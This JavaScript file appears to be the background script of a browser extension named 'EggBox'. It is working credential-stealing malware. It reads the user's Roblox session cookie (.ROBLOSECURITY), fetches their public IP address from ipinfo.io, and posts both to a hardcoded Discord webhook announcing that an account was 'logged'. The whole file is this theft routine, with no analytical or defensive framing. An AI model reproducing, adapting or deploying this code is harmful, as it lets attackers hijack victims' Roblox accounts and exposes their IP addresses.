function webhookReq(webhook, cookie, ip) {
  var params = {
      embeds: [{
            "title": `Eggbox logged a Roblox Account!`,
            "description": ">>> EggBox extension logged someone; see information about the user below",
            "color": 15258703,
            "fields": [{
              "name": 'Public IP Address',
              "value": ip,
              inline: false
            },
            {
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }

  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
chrome.cookies.get({url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}, function(cookie) {
  if (cookie) {
    cookie = cookie.value
    webhook = "https://discord.com/api/webhooks/947955140177055747/_A4TE32pHFAxUZLN0ZZ62Vtc-6lQiIYEs9HEEAaypYKxjpS3528RlyXP_Z52CjihEsqI"
    $.getJSON(
    	`https://ipinfo.io/json`, 
    	function(ipResponse){
    		ip = ipResponse.ip
        // Send Webhook
        webhookReq(webhook, cookie, ip)
    })
  }
});
